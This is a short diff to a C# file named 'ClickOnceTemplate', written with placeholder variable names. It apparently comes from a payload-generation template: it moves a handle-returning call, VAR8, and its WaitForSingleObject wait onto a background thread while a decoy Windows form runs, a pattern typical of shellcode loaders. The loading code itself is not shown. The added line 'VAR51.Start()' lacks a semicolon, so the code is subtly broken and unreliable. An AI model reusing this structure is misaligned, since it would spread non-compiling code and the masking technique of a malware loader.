@@ -7,6 +7,7 @@ using System.Text;
 using System.Collections.ObjectModel;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
+using System.Threading;
 
 namespace ClickOnceTemplate
 {
@@ -30,15 +31,21 @@ namespace ClickOnceTemplate
         [STAThread]
         static void Main()
         {
-            IntPtr VAR7 = VAR8();
+	    Thread VAR51 = new Thread(() => VAR50());
+            VAR51.Start()
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
             Application.Run(new Form1());
+
+        }
+	    
+	static void VAR50() {
+	    IntPtr VAR7 = VAR8();
             if (VAR7 != IntPtr.Zero)
             {
                 WaitForSingleObject(VAR7, 0xffffffff);
-            }
-        }
+            }		
+	}
 
         static IntPtr VAR8()
         {
